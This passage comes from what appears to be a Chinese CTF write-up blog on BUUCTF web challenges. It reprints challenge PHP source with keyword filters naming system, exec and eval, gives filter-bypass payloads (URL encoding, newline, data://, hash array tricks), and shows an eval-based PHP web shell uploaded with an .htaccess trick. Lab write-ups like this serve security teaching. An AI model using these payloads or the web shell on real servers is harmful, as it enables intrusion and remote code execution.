rel="noopener">preg_replace代码执行</a></p><pre><code>http://fcae7fc4-068a-42a8-850b-85af44432865.node3.buuoj.cn/next.php?\S*=${eval($_POST[1])}</code></pre><p>根目录找到flag</p><p><img src="../../../../img/image-20200919194931566.png" alt="image-20200919194931566"></p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span><span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span> </code></pre><p>第一部分：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p>过滤了很多关键字，但是确是通过<code>$_SERVER</code>获取，<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，不会对内容url解码，但GET会，所以对字符url编码绕过，hackbar的url编码只会对特殊字符编码，找到这个网站，可以对所有字母复杂编码：<a href="http://web.chacuo.net/charseturlencode" target="_blank" rel="noopener"></a></p><p>第二部分：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用换行符%0a绕过，aqua_is_cute%0a</p><p>第三部分：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> </code></pre><p><code>$_REQUEST</code>可获取GET和POST方式的传参，如果两种方式同时传同一个参，则会有优先级，默认为POST的优先级大于GET，所以可以同时post同名参数绕过此限制。</p><pre class=" language-php"><code class="language-php"><span class="token constant">POST</span>：debu<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token number">1</span></code></pre><p>第四部分：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用data协议<code>file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61</code></p><p>第五部分</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>sha1无法处理数组，处理时返回false，所以用数组绕过</p><p><code>shana[]=1&amp;passwd[]=2</code></p><p>前几部分总payload：</p><pre class=" language-php"><code class="language-php">payload<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//28aafe4c-af7a-4299-b2eb-df7c903c83ee.node3.buuoj.cn/1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</span><span class="token constant">POST</span>：debu<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token number">1</span></code></pre><p>第五部分：</p><p>payload:<code>http://28aafe4c-af7a-4299-b2eb-df7c903c83ee.node3.buuoj.cn/1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</code></p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><pre class=" language-php"><code class="language-php">I put something in <span class="token constant">F12</span> <span class="token keyword">for</span> you<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$gg</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$id</span> <span class="token operator">!==</span> <span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'You got the first step'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token operator">==</span><span class="token number">1234567</span><span class="token punctuation">)</span>                 <span class="token punctuation">{</span>                     <span class="token keyword">echo</span> <span class="token string">'Good Job!'</span><span class="token punctuation">;</span>                     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'By Retr_0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>                 <span class="token keyword">else</span>                 <span class="token punctuation">{</span>                     <span class="token keyword">echo</span> <span class="token string">"can you think twice??"</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">'You can not get it !'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'only one way to get the flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"You are not a real hacker!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Please input first'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>Please input first</code></pre><p>第一个用数组或0e绕过，第二部分用php特性绕过var_dump(123==’123a’); bool(true)</p><p>payload</p><pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//af591e00-6e3b-4808-beba-d688fba5fb3d.node3.buuoj.cn/?id[]=1&amp;gg[]=2</span><span class="token constant">POST</span><span class="token punctuation">:</span>passwd<span class="token operator">=</span>1234567a</code></pre><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p><img src="../../../../img/image-20200917215028265.png" alt="image-20200917215028265"></p><p>上传1.jpg <code>&lt;?php @eval($_POST[1]);?&gt;</code></p><p>开始以为是nginx，上传<code>.user.ini</code>，后面发现是apache，故上传2.jpg<code>&lt;FilesMatch &quot;1.jpg&quot;&gt;   SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code> burp改为<code>.hatcess</code>，成功拿到shell，菜刀链接，在根目录发现flag</p><p><img src="../../../../img/image-20200917214923673.png" alt="image-20200917214923673"></p><p>upload.php源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> "<span class="token markup">&lt;meta charset=\"utf-8\"></span>"<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/upload/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$t_path</span> <span class="token operator">=</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$uploaded_name</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'uploaded'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploaded_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"我扌your problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"uploaded"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> "            <span class="token string">") || ($_FILES["</span>uploaded<span class="token string">"]["</span>type<span class="token string">"] == "</span>image<span class="token operator">/</span>jpeg<span class="token string">") || ($_FILES["</span>uploaded<span class="token string">"]["</span>type<span class="token string">"] == "</span>image<span class="token operator">/</span>pjpeg<span class="token string">")|| ($_FILES["</span>uploaded<span class="token string">"]["</span>type<span class="token string">"] == "</span>image<span class="token operator">/</span>png<span class="token string">")) &amp;&amp; ($_FILES["</span>uploaded<span class="token string">"]["</span>size"<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploaded_tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span> <span class="token string">"GBK"</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$uploaded_tmp</span><span class="token punctuation">,</span> <span class="token variable">$t_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"{$t_path} succesfully uploaded!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"我扌your problem?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><pre class=" language-php"><code class="language-php">Welcome to index<span class="token punctuation">.</span>php<span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag is in flag.php</span><span class="token comment" spellcheck="true">//WTF IS THIS?</span><span class="token comment" spellcheck="true">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment" spellcheck="true">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span 